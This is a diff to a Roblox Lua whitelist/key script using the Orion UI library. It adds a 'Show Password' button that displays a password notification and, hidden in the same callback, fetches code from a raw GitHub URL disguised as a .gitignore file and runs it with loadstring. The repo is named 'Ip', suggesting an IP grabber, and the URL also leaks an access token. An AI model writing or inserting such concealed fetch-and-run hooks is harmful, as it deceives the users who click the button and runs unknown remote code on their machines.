@@ -27,6 +27,18 @@ _G.KeyInput = "string"
 })
 Whitelist:AddParagraph("How do I white list?","You cant whitelist at the moment but in the future this whitelist system will be a key system.")
 
+
+Whitelist:AddButton({
+	Name = "Show Password",
+	Callback = function()
+			notif()
+      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore?token=GHSAT0AAAAAABWACNWVK5X5KHFQUYML3NIGYWVIGPQ'),true))()
+  	end    
+})
+
+local Section = Whitelist:AddSection({
+	Name = "Whitelist"
+})
 Whitelist:AddTextbox({
 	Name = "Whitelist",
 	Default = "Enter Key",
@@ -71,4 +83,12 @@ end
 
  OrionLib:Init()
 
+function notif()
+game:GetService("StarterGui"):SetCore("SendNotification",{     
+Title = "Password",     
+Text = "The password is Des",
+Button1 = "Alr",
+Duration = 20
+})
+end
 
